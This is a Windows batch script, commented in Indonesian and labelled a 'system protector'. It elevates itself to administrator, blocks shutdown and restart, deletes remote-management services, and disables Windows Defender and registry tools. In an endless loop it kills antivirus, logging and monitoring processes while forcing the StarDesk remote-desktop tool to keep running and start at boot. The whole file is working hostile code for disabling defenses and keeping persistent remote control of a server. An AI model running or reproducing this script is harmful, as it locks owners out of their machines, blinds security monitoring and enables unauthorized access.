@echo off
title PELINDUNG SISTEM - STARDEsk AKTIF
mode con cols=60 lines=15
color 0C

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if %errorlevel% neq 0 (
    echo Meminta hak akses penuh...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

cls
echo.
echo 🔐  SEDANG MENGUNCI SISTEM SECARA PERMANEN...
echo ==============================================
echo.

reg add "HKLM\SYSTEM\CurrentControlSet\Control\Windows" /v NoShutdown /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul

takeown /f %windir%\system32\shutdown.exe /a >nul
icacls %windir%\system32\shutdown.exe /deny *S-1-1-0:F /inheritance:r >nul
attrib +R +S +H %windir%\system32\shutdown.exe

takeown /f %windir%\system32\restart.exe /a >nul 2>&1
icacls %windir%\system32\restart.exe /deny *S-1-1-0:F /inheritance:r >nul 2>&1
attrib +R +S +H %windir%\system32\restart.exe >nul 2>&1

reg add "HKLM\SOFTWARE\Microsoft\WBEM\CIMOM" /v DisableWin32Shutdown /t REG_DWORD /d 1 /f >nul
sc config TermService start= disabled >nul
sc stop TermService >nul
sc delete TermService >nul
sc config WinRM start= disabled >nul
sc stop WinRM >nul
sc delete WinRM >nul
sc config RemoteRegistry start= disabled >nul
sc stop RemoteRegistry >nul
sc config ipmi start= disabled >nul
sc stop ipmi >nul
sc delete ipmi >nul

reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableRestorePoint /t REG_DWORD /d 1 /f >nul

; ---- MODIFIKASI: STARDEsk TETAP HIDUP ----
; REGISTRY UNTUK AUTO-START STARDEsk JIKA MATI
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v StarDesk /t REG_SZ /d "C:\Program Files\StarDesk\StarDesk.exe" /f >nul 2>&1
reg add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run" /v StarDesk /t REG_SZ /d "C:\Program Files\StarDesk\StarDesk.exe" /f >nul 2>&1

; JIKA STARDEsk DI PATH LAIN, COBA BEBERAPA LOKASI
if exist "C:\Program Files (x86)\StarDesk\StarDesk.exe" (
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v StarDesk /t REG_SZ /d "C:\Program Files (x86)\StarDesk\StarDesk.exe" /f >nul
)
if exist "C:\Users\*\AppData\Local\StarDesk\StarDesk.exe" (
    reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v StarDesk /t REG_SZ /d "C:\Users\%USERNAME%\AppData\Local\StarDesk\StarDesk.exe" /f >nul
)

; ---- AKHIR MODIFIKASI STARDEsk ----

cls
echo.
echo ✅ SISTEM TELAH DIKUNCI TOTAL
echo ✅ STARDEsk TETAP AKTIF - ADMIN BISA TERHUBUNG
echo ❌ SERVER TIDAK BISA MEMATIKAN ATAU MENGUBAH APA PUN
echo 🔥 PENGAWASAN DIMULAI...
echo.
echo Tekan Ctrl+C hanya jika ingin menghentikan pemantauan saja
echo ==========================================================

:ULANG
title MENGAWASI - SISTEM AMAN - STARDEsk AKTIF

; ---- SEMUA TASKKILL TETAP BERJALAN, KECUALI STARDEsk ----
taskkill /F /IM categraf.exe /T >nul 2>&1
taskkill /F /IM geeLevel.exe /T >nul 2>&1
taskkill /F /IM ctfmon.exe /T >nul 2>&1
taskkill /F /IM nxpauxsvc.exe /T >nul 2>&1
taskkill /F /IM SbieSvc.exe /T >nul 2>&1
taskkill /F /IM supervisord.exe /T >nul 2>&1
taskkill /F /IM websocket.exe /T >nul 2>&1
taskkill /F /IM vncserver.exe /T >nul 2>&1
taskkill /F /IM vncagent.exe /T >nul 2>&1
taskkill /F /IM Winlogbeat.exe /T >nul 2>&1
taskkill /F /IM walsdog.exe /T >nul 2>&1
taskkill /F /IM walsdogsvc.exe /T >nul 2>&1
taskkill /F /IM MsMpEng.exe /T >nul 2>&1
taskkill /F /IM NisSrv.exe /T >nul 2>&1
taskkill /F /IM SecurityHealthService.exe /T >nul 2>&1
taskkill /F /IM wmiprvse.exe /T >nul 2>&1

; ---- BARIS STARDEsk TIDAK DIKILL ----
; taskkill /F /IM StarDesk.exe /T  <-- DIHAPUS
; taskkill /F /IM StarDesk64.exe /T <-- DIHAPUS

; ---- PASTIKAN STARDEsk MASIH BERJALAN ----
powershell -Command "if (-not (Get-Process -Name 'StarDesk' -ErrorAction SilentlyContinue)) { Start-Process 'C:\Program Files\StarDesk\StarDesk.exe' }" >nul 2>&1
powershell -Command "if (-not (Get-Process -Name 'StarDesk64' -ErrorAction SilentlyContinue)) { Start-Process 'C:\Program Files\StarDesk\StarDesk64.exe' }" >nul 2>&1

reg add "HKLM\SYSTEM\CurrentControlSet\Control\Windows" /v NoShutdown /t REG_DWORD /d 1 /f >nul

ping -n 1 127.0.0.1 -w 150 >nul
goto ULANG